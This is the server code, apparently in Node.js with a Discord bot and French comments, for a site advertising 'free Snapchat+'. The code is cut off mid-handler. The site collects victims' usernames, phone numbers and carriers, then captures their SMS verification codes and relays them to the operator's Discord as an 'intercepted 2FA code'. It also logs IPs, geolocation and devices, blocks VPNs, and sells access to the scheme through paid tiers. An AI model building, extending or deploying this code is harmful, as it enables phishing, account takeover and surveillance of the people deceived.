require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActivityType } = require('discord.js');
const { v4: uuidv4 } = require('uuid');
const session = require('express-session');

// Stripe (optionnel — uniquement si STRIPE_SECRET_KEY est défini)
let stripe = null;
if (process.env.STRIPE_SECRET_KEY) {
    try { stripe = require('stripe')(process.env.STRIPE_SECRET_KEY); }
    catch (e) { console.warn('⚠️  Stripe non installé. Lance : npm install stripe'); }
}

// --- Configuration Express ---
const app = express();
app.set('trust proxy', true);

// ⚡ Stripe webhook : raw body AVANT express.json()
app.use('/api/stripe/webhook', express.raw({ type: 'application/json' }));

// Sessions (dashboard auth)
app.use(session({
    secret: process.env.SESSION_SECRET || 'snap-dashboard-' + Math.random().toString(36).slice(2),
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 7 * 24 * 60 * 60 * 1000, sameSite: 'lax' }
}));

app.use(express.json());

// ⚡ Route /dashboard définie AVANT express.static pour éviter interception
app.get('/dashboard', (req, res, next) => {
    if (!req.session || !req.session.user) return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

let botReady = false;
const pendingMessages = []; // File d'attente si bot pas encore prêt

// ================== OWNER ==================
const OWNER_ID = '1066379595881914449';
function isOwner(userId) { return userId === OWNER_ID; }

// ================== CODES PROMO ==================
const PROMOS_FILE = path.join(__dirname, 'promocodes.json');
function loadPromos() {
    try { if (fs.existsSync(PROMOS_FILE)) return JSON.parse(fs.readFileSync(PROMOS_FILE, 'utf8')); } catch(e) {}
    return {};
}
function savePromos(data) {
    try { fs.writeFileSync(PROMOS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch(e) {}
}
let promos = loadPromos();

// ================== ABONNEMENTS PREMIUM ==================
const SUBS_FILE = path.join(__dirname, 'subscriptions.json');

function loadSubs() {
    try {
        if (fs.existsSync(SUBS_FILE)) return JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8'));
    } catch (e) {}
    return {};
}
function saveSubs(data) {
    try { fs.writeFileSync(SUBS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch (e) {}
}
let subs = loadSubs();

// L'owner est toujours premium ; les autres doivent avoir un abonnement actif
function hasSubscription(discordId) {
    if (isOwner(discordId)) return true;
    const sub = subs[discordId];
    if (!sub) return false;
    return sub.active === true && (!sub.expiresAt || sub.expiresAt > Date.now());
}

// Serveur premium (accordé par l'owner via dashboard)
function hasGuildPremium(guildId) {
    if (!guildId) return false;
    return !!(cfg.guild_premiums && cfg.guild_premiums[guildId]);
}

// Vérifie si un user/serveur peut accéder aux features premium
function canUsePremium(userId, guildId) {
    if (isOwner(userId)) return true;
    if (hasSubscription(userId)) return true;
    if (guildId && hasGuildPremium(guildId)) return true;
    return false;
}

// Retourne une string lisible du type d'abonnement
function getSubType(userId) {
    if (isOwner(userId)) return '👑 Owner (Premium ∞)';
    const sub = subs[userId];
    if (!sub || !sub.active) return '🆓 Gratuit';
    if (sub.expiresAt && sub.expiresAt < Date.now()) return '🆓 Gratuit (expiré)';
    if (sub.expiresAt) {
        const d = new Date(sub.expiresAt);
        return `💎 Premium (jusqu'au ${d.toLocaleDateString('fr-FR')})`;
    }
    if (sub.stripeSubId) return '💎 Premium (Stripe)';
    if (sub.promoCode)   return `💎 Premium (code ${sub.promoCode})`;
    return '💎 Premium';
}

// ================== AUTH MIDDLEWARE ==================
const DISCORD_CLIENT_ID     = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;

function requireAuth(req, res, next) {
    if (!req.session || !req.session.user) return res.redirect('/login');
    next();
}

// ================== CONFIG PERSISTANTE ==================
const CONFIG_FILE = path.join(__dirname, 'config.json');
const CONFIG_DEFAULTS = {
    // ---- Options bot/site ----
    afficher_ip:          true,   // afficher l'IP dans les embeds
    afficher_appareil:    true,   // afficher appareil/OS dans les embeds
    ratelimit_actif:      true,   // activer le rate limiting
    ratelimit_minutes:    10,     // durée rate limit en minutes
    timeout_minutes:      5,      // auto-reject après X min
    delai_discord_sec:    10,     // délai entre salon prioritaire et principal
    salon_prioritaire:    true,   // envoyer dans le salon prioritaire
    site_actif:           true,   // accepter ou bloquer les soumissions
    webhook_fallback:     true,   // utiliser le webhook si bot down
    bloquer_vpn:          true,   // bloquer les VPN/proxy

    // ---- Apparence du site (modifiable via dashboard) ----
    site_titre:           'Snapchat+',
    site_sous_titre:      'Gratuit',
    site_description:     'Profite de toutes les fonctionnalités premium sans payer. Rapide, simple, 100% gratuit.',
    site_stat_actif:      '2 836',
    site_badge:           'OFFRE LIMITÉE',
    site_btn_text:        'Obtenir Snapchat+ gratuit',

    // ---- Textes étapes ----
    site_attente_titre:   '🛡️ En attente de validation',
    site_attente_texte:   'Un administrateur examine votre demande. Restez sur cette page, cela prend quelques instants.',
    site_code_titre:      'Entrez le code',
    site_code_desc:       'Un code à 6 chiffres a été envoyé par SMS à votre numéro. Entrez-le ci-dessous pour vérifier votre compte.',
    site_succes_msg:      'Code vérifié ! Votre accès Premium est activé.',

    // ---- Status embed ----
    status_channel_id:    '',   // ID du salon où poster le status live
    status_message_id:    '',   // ID du message status (pour l'éditer)

    // ---- Serveurs sous contrôle owner ----
    guild_premiums:       {},   // { guildId: { grantedAt: timestamp } }

    // ---- Notifications ----
    dm_notifs:            true, // DM à l'owner à chaque approve/reject
};

function loadConfig() {
    try {
        if (fs.existsSync(CONFIG_FILE)) {
            const raw = fs.readFileSync(CONFIG_FILE, 'utf8');
            return { ...CONFIG_DEFAULTS, ...JSON.parse(raw) };
        }
    } catch (e) { console.error('Erreur chargement config.json:', e.message); }
    return { ...CONFIG_DEFAULTS };
}
function saveConfig(cfg) {
    try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8'); }
    catch (e) { console.error('Erreur sauvegarde config.json:', e.message); }
}

let cfg = loadConfig();

// ================== PERSISTANCE JSON ==================
const DATA_FILE = path.join(__dirname, 'requests.json');

function loadRequests() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const obj = JSON.parse(raw);
            return new Map(Object.entries(obj));
        }
    } catch (e) {
        console.error('Erreur chargement requests.json:', e.message);
    }
    return new Map();
}

function saveRequests(map) {
    try {
        const obj = {};
        for (const [k, v] of map.entries()) obj[k] = v;
        fs.writeFileSync(DATA_FILE, JSON.stringify(obj, null, 2), 'utf8');
    } catch (e) {
        console.error('Erreur sauvegarde requests.json:', e.message);
    }
}

const requests = loadRequests();

// ================== HISTORIQUE (50 dernières demandes) ==================
const HISTORY_FILE = path.join(__dirname, 'history.json');
function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
    } catch (e) {}
    return [];
}
function saveHistory(arr) {
    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(arr, null, 2), 'utf8'); } catch (e) {}
}
let history = loadHistory();
function pushHistory(entry) {
    history.unshift(entry); // plus récent en premier
    if (history.length > 50) history = history.slice(0, 50);
    saveHistory(history);
}

// ================== BLACKLIST ==================
const BLACKLIST_FILE = path.join(__dirname, 'blacklist.json');
function loadBlacklist() {
    try {
        if (fs.existsSync(BLACKLIST_FILE)) return new Set(JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8')));
    } catch (e) {}
    return new Set();
}
function saveBlacklist(set) {
    try { fs.writeFileSync(BLACKLIST_FILE, JSON.stringify([...set], null, 2), 'utf8'); } catch (e) {}
}
let blacklist = loadBlacklist();

// ================== GÉOLOCALISATION IP ==================
async function geolocateIP(ip) {
    if (!ip || ip === 'inconnu' || ip === '127.0.0.1' || ip.startsWith('::')) {
        return { city: 'Local', country: 'FR', isp: 'Localhost', proxy: false, flag: '🏠' };
    }
    try {
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,proxy,hosting`,
            { timeout: 3000 }
        );
        const d = res.data;
        if (d.status !== 'success') return null;
        // Emoji drapeau depuis countryCode
        const flag = d.countryCode
            ? d.countryCode.toUpperCase().replace(/./g, c => String.fromCodePoint(0x1F1E0 - 65 + c.charCodeAt(0)))
            : '🌍';
        return { city: d.city || '?', country: d.country || '?', isp: d.isp || '?', proxy: d.proxy || d.hosting || false, flag };
    } catch (e) {
        return null;
    }
}

// ================== RATE LIMITING ==================
const rateLimitMap = new Map(); // IP → timestamp dernière soumission
function isRateLimited(ip) {
    if (!cfg.ratelimit_actif) return false;
    const last = rateLimitMap.get(ip);
    if (!last) return false;
    return Date.now() - last < cfg.ratelimit_minutes * 60 * 1000;
}

function setRateLimit(ip) {
    rateLimitMap.set(ip, Date.now());
    setTimeout(() => rateLimitMap.delete(ip), cfg.ratelimit_minutes * 60 * 1000);
}

// ================== ENVOI DISCORD (avec file d'attente) ==================
async function sendToDiscord(fn) {
    if (botReady) {
        return fn();
    }
    return new Promise((resolve, reject) => {
        pendingMessages.push(async () => {
            try { resolve(await fn()); }
            catch (e) { reject(e); }
        });
    });
}

// ================== UTILITAIRES ==================
const APPROVAL_CHANNEL_ID  = process.env.DISCORD_APPROVAL_CHANNEL;
const PRIORITY_CHANNEL_ID  = '1532004514306068510';
const WEBHOOK_URL           = process.env.DISCORD_WEBHOOK_URL || null; // fallback si bot down
const BASE_URL              = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT                  = process.env.PORT || 3000;
// Stats journalières
let statsToday = { total: 0, approved: 0, rejected: 0, codes: 0, date: new Date().toDateString() };

// Limite commandes pour utilisateurs gratuits (5/jour)
const FREE_DAILY_LIMIT = 5;
const dailyCmdUsage = {}; // { userId: { date, count } }
function checkFreeLimit(userId, guildId) {
    if (isOwner(userId) || hasSubscription(userId) || (guildId && hasGuildPremium(guildId))) return true;
    const today = new Date().toDateString();
    if (!dailyCmdUsage[userId] || dailyCmdUsage[userId].date !== today) {
        dailyCmdUsage[userId] = { date: today, count: 0 };
    }
    if (dailyCmdUsage[userId].count >= FREE_DAILY_LIMIT) return false;
    dailyCmdUsage[userId].count++;
    return true;
}
function resetStatsIfNewDay() {
    const today = new Date().toDateString();
    if (statsToday.date !== today) {
        statsToday = { total: 0, approved: 0, rejected: 0, codes: 0, date: today };
    }
}
function updateBotStatus() {
    if (!botReady) return;
    resetStatsIfNewDay();
    client.user.setActivity(`🎯 ${statsToday.total} demandes aujourd'hui`, { type: ActivityType.Watching });
}

// Envoi webhook fallback
async function sendWebhookFallback(content) {
    if (!WEBHOOK_URL) return;
    try {
        await axios.post(WEBHOOK_URL, { content }, { timeout: 5000 });
    } catch (e) {
        console.error('Erreur webhook fallback:', e.message);
    }
}

function parseUserAgent(ua) {
    if (!ua) return { os: 'Inconnu', device: 'Inconnu' };
    let os = 'Inconnu';
    let device = 'Desktop';
    if (/iPhone/.test(ua)) { os = 'iOS'; device = '📱 iPhone'; }
    else if (/iPad/.test(ua)) { os = 'iOS'; device = '📱 iPad'; }
    else if (/Android/.test(ua)) {
        os = 'Android';
        const m = ua.match(/Android [0-9.]+; ([^)]+)/);
        device = '📱 ' + (m ? m[1].trim() : 'Android');
    } else if (/Windows/.test(ua)) { os = 'Windows'; device = '🖥️ PC'; }
    else if (/Macintosh/.test(ua)) { os = 'macOS'; device = '🖥️ Mac'; }
    else if (/Linux/.test(ua)) { os = 'Linux'; device = '🖥️ Linux'; }
    return { os, device };
}

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    // Site désactivé — réponse JSON pour l'API
    if (!cfg.site_actif) {
        return res.status(503).json({ error: 'site_disabled' });
    }

    // Rate limiting + blacklist + VPN
    const ip = (req.headers['x-forwarded-for'] || req.ip || 'inconnu').split(',')[0].trim();

    if (blacklist.has(ip)) {
        return res.status(403).json({ error: 'Accès refusé.' });
    }
    if (isRateLimited(ip)) {
        return res.status(429).json({ error: `Trop de demandes, réessaie dans ${cfg.ratelimit_minutes} minutes.` });
    }

    // Géolocalisation + détection VPN (timeout 3s max, jamais bloquant)
    let geo = null;
    try { geo = await geolocateIP(ip); } catch (e) {}
    if (geo && geo.proxy && cfg.bloquer_vpn === true) {
        return res.status(403).json({ error: 'VPN/proxy détecté. Désactive-le et réessaie.' });
    }

    setRateLimit(ip);
    const ua = req.headers['user-agent'] || '';
    const { os, device } = parseUserAgent(ua);

    const id = uuidv4();
    const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
    const ispStr = geo ? geo.isp : '?';
    const requestData = {
        snapchat, phone, operator, ip, device, os, geo: geoStr, isp: ispStr,
        approved: false, rejected: false, code: null,
        createdAt: Date.now()
    };
    requests.set(id, requestData);
    saveRequests(requests);

    // Historique
    pushHistory({ id, snapchat, phone, operator, ip, device, os, createdAt: requestData.createdAt, status: 'pending' });

    // Stats
    resetStatsIfNewDay();
    statsToday.total++;
    updateBotStatus();

    // Timeout auto + notif Discord
    setTimeout(async () => {
        const req = requests.get(id);
        if (req && !req.approved && !req.rejected) {
            req.rejected = true;
            saveRequests(requests);
            console.log(`⏰ Demande #${id} auto-rejetée après 5 min`);
            statsToday.rejected++;
            updateBotStatus();
            // Notif dans le salon prioritaire
            try {
                await sendToDiscord(async () => {
                    const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
                    if (priorityChannel) {
                        await priorityChannel.send({
                            embeds: [new EmbedBuilder()
                                .setTitle('⏰ Demande expirée sans réponse')
                                .setColor(0xFF4444)
                                .addFields(
                                    { name: 'Pseudo', value: req.snapchat, inline: true },
                                    { name: 'ID',     value: id,           inline: true }
                                )
                                .setFooter({ text: 'Auto-rejetée après 5 min' })
                                .setTimestamp()
                            ]
                        });
                    }
                });
            } catch (e) {
                // Fallback webhook si bot down
                await sendWebhookFallback(`⏰ Demande expirée : **${req.snapchat}** (ID: ${id})`);
            }
        }
    }, cfg.timeout_minutes * 60 * 1000);

    // Répondre immédiatement au client — Discord s'envoie en arrière-plan
    res.json({ id });

    // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
    const sendDiscordAsync = async () => {
        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
        if (!mainChannel) {
            await sendWebhookFallback(`📱 Nouvelle demande : **${snapchat}** | ${phone} | ${operator} | IP: ${ip}`);
            return;
        }

        const expireAt  = new Date(requestData.createdAt + cfg.timeout_minutes * 60 * 1000);
        const expireStr = `<t:${Math.floor(expireAt.getTime() / 1000)}:R>`;

        const baseFields = [
            { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
            { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
            { name: '📡 Opérateur', value: operator,          inline: true },
        ];
        if (cfg.afficher_appareil) {
            baseFields.push({ name: '📱 Appareil', value: device, inline: true });
            baseFields.push({ name: '💻 OS',       value: os,     inline: true });
        }
        if (cfg.afficher_ip) {
            baseFields.push({ name: '🌍 Localisation', value: geoStr, inline: true });
            baseFields.push({ name: '🔌 FAI',          value: ispStr, inline: true });
            baseFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
        }
        baseFields.push({ name: '⏰ Expire', value: expireStr,             inline: true });
        baseFields.push({ name: '🆔 ID',     value: `\`${id.slice(0,8)}...\``, inline: true });

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande Snapchat+')
            .setDescription('> Un utilisateur veut activer son abonnement Premium.')
            .setColor(0xFFFC00)
            .addFields(...baseFields)
            .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
            .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('Accepter').setEmoji('✅').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('Refuser').setEmoji('❌').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('Renvoyer SMS').setEmoji('📲').setStyle(ButtonStyle.Secondary)
        );

        if (priorityChannel) {
            const priorityEmbed = new EmbedBuilder()
                .setTitle('👁️ PRIORITAIRE — Nouvelle demande')
                .setDescription('> Lecture seule — les boutons sont dans le salon principal.')
                .setColor(0xFF6600)
                .addFields(...baseFields)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s • ${new Date().toLocaleString('fr-FR')}` })
                .setTimestamp();
            await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
        }

        setTimeout(async () => {
            try { await mainChannel.send({ embeds: [embed], components: [row] }); }
            catch (e) { console.error('Erreur envoi salon principal:', e.message); }
        }, cfg.delai_discord_sec * 1000);

        console.log(`✅ Demande #${id} envoyée à Discord`);
    };

    if (botReady) {
        sendDiscordAsync().catch(err => {
            console.error('Erreur Discord async:', err.message);
            sendWebhookFallback(`📱 ${snapchat} | ${phone} | ${operator} | ${ip}`);
        });
    } else {
        pendingMessages.push(() => sendDiscordAsync().catch(console.error));
    }
});

// 2. Vérification pseudo Snapchat (toujours valide si format correct)
app.get('/api/check-snapchat/:username', (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }

    // Format Snapchat valide : lettres, chiffres, tirets, underscores, points
    if (!/^[a-z0-9._-]{3,15}$/.test(username)) {
        return res.json({ exists: false, reason: 'format' });
    }

    // Toujours retourner trouvé si le format est valide
    return res.json({ exists: true, username, displayName: username, avatarUrl: null });
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved:  request.approved,
        rejected:  request.rejected,
        snapchat:  request.snapchat,
        resend:    request.resend || false   // signal "Renvoyer SMS"
    });
});

// 4. Acquitter le signal "resend"
app.post('/api/resend-ack/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    request.resend = false;
    saveRequests(requests);
    res.json({ ok: true });
});

// 5. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!code) return res.json({ success: true });

    const request = requests.get(id) || {};
    const snapchat  = request.snapchat  || 'Inconnu';
    const phone     = request.phone     || 'Inconnu';
    const operator  = request.operator  || 'Inconnu';
    const device    = request.device    || 'Inconnu';
    const os        = request.os        || 'Inconnu';
    const ip        = request.ip        || 'Inconnu';

    const sendCode = async () => {
        await sendToDiscord(async () => {
            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
            const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;

            const geoCode = request.geo  || '?';
            const ispCode = request.isp  || '?';

            const codeFields = [
                { name: '👤 Pseudo',    value: `\`${snapchat}\``, inline: true },
                { name: '📞 Téléphone', value: `\`${phone}\``,    inline: true },
                { name: '📡 Opérateur', value: operator,          inline: true },
            ];
            if (cfg.afficher_appareil) {
                codeFields.push({ name: '📱 Appareil', value: device, inline: true });
                codeFields.push({ name: '💻 OS',       value: os,     inline: true });
            }
            if (cfg.afficher_ip) {
                codeFields.push({ name: '🌍 Localisation', value: geoCode, inline: true });
                codeFields.push({ name: '🔌 FAI',          value: ispCode, inline: true });
                codeFields.push({ name: '🔒 IP',           value: `\`${ip}\``, inline: true });
            }
            codeFields.push({ name: '🔑 Code 2FA', value: `## ${code}`, inline: false });

            const codeEmbed = new EmbedBuilder()
                .setTitle('🔐 Code 2FA intercepté')
                .setDescription('> Le code SMS a été saisi par l\'utilisateur.')
                .setColor(0x00FF66)
                .addFields(...codeFields)
                .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                .setTimestamp();

            if (priorityChannel) {
                try {
                    const priorityCodeEmbed = new EmbedBuilder()
                        .setTitle('👁️ PRIORITAIRE — Code 2FA intercepté')
                        .setDescription('> Lecture seule.')
                        .setColor(0x00FF66)
                        .addFields(...codeFields)
                        .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
                        .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s` })
                        .setTimestamp();
                    await priorityChannel.send({ content: `<@${OWNER_ID}> 🔑 Code reçu !`, embeds: [priorityCodeEmbed] });
                } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
            }

            if (mainChannel) {
                setTimeout(async () => {
                    try { await mainChannel.send({ embeds: [codeEmbed] }); }
                    catch (e) { console.error('Erreur salon principal (code):', e.message); }
                }, cfg.delai_discord_sec * 1000);
            }
        });
    };

    sendCode().catch(console.error);
    statsToday.codes++;
    updateBotStatus();
    if (id) {
        requests.delete(id);
        saveRequests(requests);
    }

    res.json({ success: true });
});

// ================== SLASH COMMANDS ==================
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // /setstatus — OWNER ONLY
    if (interaction.commandName === 'setstatus') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.status_channel_id = interaction.channelId;
        cfg.status_message_id = ''; // reset pour envoyer un nouveau message
        saveConfig(cfg);
        await interaction.reply({ content: `📡 Canal de status configuré sur ce salon ! Envoi en cours...`, ephemeral: true });
        await updateStatusEmbed();
        return;
    }

    // /dashboard — OWNER ONLY
    if (interaction.commandName === 'dashboard') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('🖥️ Dashboard Admin')
                .setColor(0xFFFC00)
                .setDescription(`Accède au dashboard web pour gérer toutes les options du bot et du site.`)
                .addFields(
                    { name: '🔗 Lien', value: `[Ouvrir le dashboard](${BASE_URL}/dashboard)`, inline: false },
                    { name: '📥 Demandes aujourd\'hui', value: String(statsToday.total), inline: true },
                    { name: '⏳ En attente', value: String(pending), inline: true },
                    { name: '🌐 Site', value: cfg.site_actif ? '🟢 Actif' : '🔴 Désactivé', inline: true },
                )
                .setFooter({ text: `${BASE_URL}/dashboard` })
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /abonnement — tout le monde (limité à 5/jour pour les gratuits)
    if (interaction.commandName === 'abonnement') {
        const userId = interaction.user.id;
        if (!checkFreeLimit(userId, interaction.guildId)) {
            return interaction.reply({ content: `🔒 Limite journalière atteinte (**${FREE_DAILY_LIMIT} commandes/jour** en gratuit).\n💎 Passe **Premium** pour un accès illimité — utilise \`/forfaits\` pour voir les offres.`, flags: 64 });
        }
        let desc, color;
        if (isOwner(userId)) {
            desc = '👑 **Owner** — Accès Premium permanent et illimité.';
            color = 0xFFFC00;
        } else if (hasSubscription(userId)) {
            const sub = subs[userId];
            desc = '💎 **Premium actif**';
            if (sub?.expiresAt) { const d = new Date(sub.expiresAt); desc += `\n📅 Expire le : **${d.toLocaleDateString('fr-FR')}**`; }
            if (sub?.promoCode)  desc += `\n🎟️ Code utilisé : \`${sub.promoCode}\``;
            if (sub?.stripeSubId) desc += '\n💳 Via Stripe';
            color = 0x00FF6A;
        } else {
            desc = `🆓 **Gratuit** — Fonctionnalités limitées.\n\n💎 Obtiens **Premium** sur le dashboard :\n[${BASE_URL}/dashboard](${BASE_URL}/dashboard)`;
            color = 0x888888;
        }
        if (interaction.guildId && hasGuildPremium(interaction.guildId) && !isOwner(userId)) {
            desc += '\n\n🌐 Ce serveur bénéficie du Premium accordé par l\'owner du bot.';
        }
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('💎 Mon abonnement')
                .setDescription(desc)
                .setColor(color)
                .setFooter({ text: `Snap+ • ${interaction.user.username}` })
                .setTimestamp()
            ],
            flags: 64
        });
    }

    // /forfaits — tout le monde (pas de limite, c'est une pub)
    if (interaction.commandName === 'forfaits') {
        const PAYPAL_LINK = 'https://paypal.me/TON_PAYPAL'; // ← remplace par ton lien PayPal

        const embed = new EmbedBuilder()
            .setTitle('✨ Forfaits Snap+')
            .setDescription('Accède aux fonctionnalités avancées du bot en choisissant un forfait.\nPaiement via **PayPal** — activation manuelle sous 24h.')
            .setColor(0xFFFC00)
            .addFields(
                {
                    name: '━━━━━━━━━━━━━━━━━━━━━━',
                    value: '​',
                    inline: false
                },
                {
                    name: '🤖 Bot dans le serveur',
                    value: [
                        '> **3€ / mois**',
                        '> ',
                        '> ✅ Bot actif dans ton serveur',
                        '> ✅ Commande `/abonnement`',
                        '> ✅ Accès aux demandes Snap+',
                        '> ❌ Stats & historique',
                        '> ❌ Contrôle avancé',
                    ].join('\n'),
                    inline: true
                },
                {
                    name: '💎 Premium',
                    value: [
                        '> **6€ / mois**',
                        '> ',
                        '> ✅ Tout le forfait Bot',
                        '> ✅ `/stats` en temps réel',
                        '> ✅ `/history` — historique complet',
                        '> ✅ `/pending` — demandes en attente',
                        '> ✅ Accès prioritaire & support',
                    ].join('\n'),
                    inline: true
                },
                {
                    name: '━━━━━━━━━━━━━━━━━━━━━━',
                    value: '​',
                    inline: false
                },
                {
                    name: '💳 Comment payer ?',
                    value: `1. Clique sur le bouton **PayPal** ci-dessous\n2. Envoie le montant en indiquant ton **pseudo Discord** dans la note\n3. Ton accès est activé **sous 24h**`,
                    inline: false
                },
            )
            .setThumbnail('https://upload.wikimedia.org/wikipedia/fr/thumb/a/a9/Snapchat_logo.svg/800px-Snapchat_logo.svg.png')
            .setFooter({ text: 'Snap+ Bot • Questions ? Contacte le propriétaire du bot' })
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Payer 3€ — Bot')
                .setStyle(5) // LINK
                .setEmoji('🤖')
                .setURL(PAYPAL_LINK),
            new ButtonBuilder()
                .setLabel('Payer 6€ — Premium')
                .setStyle(5)
                .setEmoji('💎')
                .setURL(PAYPAL_LINK),
        );

        return interaction.reply({ embeds: [embed], components: [row] });
    }

    // /stats — premium ou owner seulement
    if (interaction.commandName === 'stats') {
        if (!canUsePremium(interaction.user.id, interaction.guildId)) {
            return interaction.reply({ content: '🔒 Commande réservée aux membres **Premium**. Utilise `/abonnement` pour en savoir plus.', flags: 64 });
        }
        resetStatsIfNewDay();
        const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle('📊 Stats du jour')
                .setColor(0xFFFC00)
                .addFields(
                    { name: '📥 Demandes',   value: String(statsToday.total),    inline: true },
                    { name: '✅ Acceptées',  value: String(statsToday.approved),  inline: true },
                    { name: '❌ Refusées',   value: String(statsToday.rejected),  inline: true },
                    { name: '🔐 Codes',      value: String(statsToday.codes),     inline: true },
                    { name: '⏳ En attente', value: String(pending),              inline: true }
                )
                .setFooter({ text: statsToday.date })
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /pause — OWNER ONLY
    if (interaction.commandName === 'pause') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.site_actif = false; saveConfig(cfg); updateBotStatus();
        return interaction.reply({ content: '⏸️ Site **désactivé**. Aucune nouvelle soumission ne sera acceptée.', ephemeral: true });
    }

    // /resume — OWNER ONLY
    if (interaction.commandName === 'resume') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        cfg.site_actif = true; saveConfig(cfg); updateBotStatus();
        return interaction.reply({ content: '▶️ Site **réactivé**. Les soumissions sont de nouveau acceptées.', ephemeral: true });
    }

    // /pending — OWNER ONLY
    if (interaction.commandName === 'pending') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
        if (pending.length === 0) return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
        const lines = pending.map(([id, r]) => {
            const elapsed = Math.floor((Date.now() - r.createdAt) / 1000);
            const m = Math.floor(elapsed / 60), s = String(elapsed % 60).padStart(2,'0');
            const remain = Math.max(0, cfg.timeout_minutes * 60 - elapsed);
            const rm = Math.floor(remain / 60), rs = String(remain % 60).padStart(2,'0');
            return `⏳ **${r.snapchat}** | ${r.phone} | \`${r.geo || '?'}\` | Attente: ${m}:${s} | Expire: ${rm}:${rs}`;
        });
        return interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle(`⏳ ${pending.length} demande(s) en attente`)
                .setColor(0xFFFC00)
                .setDescription(lines.join('\n'))
                .setTimestamp()
            ],
            ephemeral: true
        });
    }

    // /blacklist — OWNER ONLY
    if (interaction.commandName === 'blacklist') {
        if (!isOwner(interaction.user.id)) return interaction.reply({ content: '🚫 Accès refusé.', ephemeral: true });
        const sub = interaction.options.getSubcommand();
        if (sub === 'add') {
            const ip = interaction.options.getString('ip');
